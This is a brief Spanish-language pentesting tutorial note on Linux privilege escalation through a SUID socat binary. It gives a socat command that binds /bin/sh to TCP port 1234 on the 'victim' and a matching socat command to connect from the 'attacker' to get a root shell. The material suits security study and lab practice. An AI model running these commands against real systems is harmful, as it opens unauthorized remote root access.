---

---
jj----
- Tags: #privesc #info #tutorial 
-----

 - Podemos usar este procedimiento para cuando Tenemos el Binario *SOCAT* como *SUID*

- Desde *Maquina Victima*
```bash
/bin/socat TCP4-LISTEN:1234,reuseaddr EXEC:"/bin/sh"
//Enter
```


- Desde *Maquina Atacante*
```
socat - TCP4:iPVictima:1234 
//Enter
```

- Con esto deberiamos ganar acceso como *Root*
-----

- [Tutorial Youtube: ](https://www.youtube.com/watch?v=1Uy-BpVLYzQ&ab_channel=FilipeCordeiro)
